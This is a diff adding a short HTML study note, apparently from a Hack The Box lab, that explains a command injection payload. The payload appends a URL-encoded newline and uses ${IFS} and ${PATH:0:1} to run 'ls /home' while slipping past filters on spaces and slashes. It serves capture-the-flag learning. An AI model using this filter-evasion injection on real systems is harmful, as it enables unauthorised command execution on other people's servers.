@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>HTB example</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>HTB example</h1><br/><br />The payload:<br />    <div class="codebox"><pre>127.0.0.1%0Als${IFS}${PATH:0:1}home</pre></div><br />is equivalent to:<br />    <div class="codebox"><pre>127.0.0.1\nls /home</pre></div><br />    %0a → \n<br />    ${IFS} → space<br />    ${PATH:0:1} → /<br /><br /><a href=""><img src="images/2427-1.png" alt="images/2427-1.png" /></a>   </div>
+</body>
+</html>
